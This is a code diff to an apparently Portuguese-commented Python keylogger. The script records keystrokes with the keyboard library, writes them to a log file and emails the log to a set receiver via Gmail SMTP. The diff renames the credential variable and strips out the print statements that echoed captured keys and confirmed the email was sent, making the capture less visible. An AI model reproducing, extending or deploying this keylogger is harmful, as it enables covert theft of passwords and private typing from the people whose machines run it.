@@ -26,7 +26,7 @@ file = open(f"{path}{filename}", 'a')
 
 # Configs para o email
 email_sender = ""                                   # Seu @gmail (ou derivados)
-email_password = ""                                 # Senha de apps do google
+email_key = ""                                      # Chave de acesso para apps menos seguros
 email_receiver = ""                                 # Email que vai receber os arquivos
 conteudo = "Arquivo de log capturado com python!"   # Mensagem de controle
 
@@ -63,10 +63,9 @@ def send_email():
     try:
         servidor_email = smtplib.SMTP('smtp.gmail.com', 587) # Configurando o servidor, podendo ser qualquer outro tipo de email
         servidor_email.starttls()
-        servidor_email.login(email_sender, email_password) # Realizando login com sua própria conta
+        servidor_email.login(email_sender, email_key) # Realizando login com sua própria conta
         servidor_email.sendmail(email_sender, email_receiver, msg.as_string()) # Enviando o email com as informações passadas anteriormente
         servidor_email.quit()
-        print("Email enviado!")
     except Exception as e:
         print(f"Erro ao enviar o email: {e}")
 
@@ -91,7 +90,6 @@ def main():
             # Keylogger em si
             key = kb.read_key()
             if kb.is_pressed(key):
-                print(key)
                 
                 # Tratando algumas possibilidades para evitar poluição do arquivo (switch case pref)
                 if key == "space":
